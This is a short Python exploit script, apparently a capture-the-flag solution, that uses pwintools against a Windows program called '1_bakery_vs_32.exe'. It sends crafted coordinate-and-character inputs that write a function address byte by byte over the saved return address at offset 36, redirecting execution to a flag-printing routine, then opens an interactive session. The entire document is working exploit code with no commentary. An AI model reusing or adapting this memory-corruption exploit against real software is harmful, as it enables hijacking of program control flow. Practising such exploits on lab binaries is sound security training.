#

from pwintools import *

retAddrOffs = 36
printFlagAddr = 0x407db0


# main

p = Process('1_bakery_vs_32.exe')

# p.set_timeout(3600000) # to have time to interact with the debugger
# input('press enter after attaching the debugger...')

p.recvuntil(b'content\r\n')

packedPrintFlag = p32(printFlagAddr)
for i in range(4):
	p.sendline(
		bytes(str(retAddrOffs + i), 'ascii') + # x coord
		b' 0,' + # y coord
		packedPrintFlag[i:i+1]# c char
	)

p.sendline('0 0,k')

print('sent')

p.interactive()
